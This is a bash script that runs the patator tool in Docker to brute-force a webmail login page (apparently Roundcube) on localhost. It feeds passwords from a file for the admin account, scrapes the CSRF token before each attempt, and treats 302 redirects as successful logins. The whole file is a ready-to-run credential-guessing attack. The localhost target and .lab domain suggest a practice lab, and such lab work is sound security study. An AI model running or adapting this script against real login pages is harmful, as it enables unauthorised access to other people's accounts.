#!/usr/bin/env bash

site='http://127.0.0.1:8080/mail/?_task=login'
pass='/tmp/pass.txt'
body='_token=_TOKEN_&_task=login&_action=login&_timezone=Europe%2FBerlin&_url=_task%3Dlogin&_user=admin%40localhost.lab&_pass=FILE0'
before_egrep='_TOKEN_:<input type="hidden" name="_token" value="(\w+)">'

docker run --rm -it -v $pass:/F0 \
patator http_fuzz url=$site method=POST \
body="$body" 0=/F0 follow=0 accept_cookie=1 \
-x ignore:code!=302 --rate-limit=20 --threads=1 \
before_urls="$site" before_egrep="$before_egrep"
